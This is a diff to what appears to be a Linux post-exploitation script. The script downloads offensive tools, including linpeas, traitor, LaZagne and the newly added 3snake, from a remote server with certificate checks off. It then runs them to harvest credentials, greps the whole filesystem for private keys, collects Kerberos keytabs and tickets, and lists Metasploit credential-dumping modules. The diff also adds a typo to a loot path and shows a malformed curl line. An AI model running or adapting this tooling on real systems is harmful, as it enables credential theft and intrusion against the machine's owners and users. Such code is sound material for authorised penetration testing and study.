@@ -54,6 +54,7 @@ download_tools() {
         wget --no-check-certificate -q "$server_url/tools/linpeas.sh"
         wget --no-check-certificate -q "$server_url/tools/les.sh"
         wget --no-check-certificate -q "$server_url/tools/nmap.zip"
+        wget --no-check-certificate -q "$server_url/tools/3snake.zip"
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             wget --no-check-certificate -q "$server_url/tools/traitor-amd64"
@@ -69,6 +70,7 @@ download_tools() {
         curl -s -k "$server_url/tools/linpeas.sh" -o linpeas.sh
         curl -s -k "$server_url/tools/les.sh" -o les.sh
         curl -s -k "$server_url/tools/nmap.zip" -o nmap.zip
+        curl -s -k "$server_url/tools/3snake.zip" -o 3snake.zip
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
@@ -81,12 +83,17 @@ download_tools() {
         fi
     fi
     unzip -qq nmap.zip
+    unzip -qq 3snake.zip
     chmod +x linpeas.sh les.sh traitor* pspy* lazagne*
 }
 
 looting() {
-    cd loot
-    ./lazagne* all | tee -a loot/lazagne.txt
+    cd 3snake/ || exit
+    make
+    ./3snake -d -o ../loot/3snake.txt
+    cd ../loot || exit
+    ../lazagne* all | tee -a loot/lazagne.txt
+
     echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
     grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a loot/priv_keys.txt
     echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
@@ -118,7 +125,7 @@ looting() {
     echo "======================= KERBEROS - CURRENT TICKETS" | tee -a loot/kerberos.txt
     klist | tee -a loot/kerberos.txt
     echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
-    find / -name "*.keytab" 2>/dev/null | tee -a loot/kerberos.txt
+    find / -name "*.keytab" 2>/dev/null | tee -a lqoot/kerberos.txt
     echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
 run post/linux/gather/hashdump
 run post/multi/gather/lastpass_creds
@@ -132,6 +139,7 @@ run post/multi/gather/remmina_creds
 run post/multi/gather/pgpass_creds
 run post/multi/gather/rsyncd_creds
 run post/multi/gather/ssh_creds
+
 ======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
 [*] BROWSER
 [*] DATABASES
@@ -150,6 +158,7 @@ escalation() {
 run post/linux/gather/enum_system
 run post/linux/gather/enum_configs
 run post/linux/gather/enum_users_history
+
 ======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
 [*] BROWSER:
     - Browser History
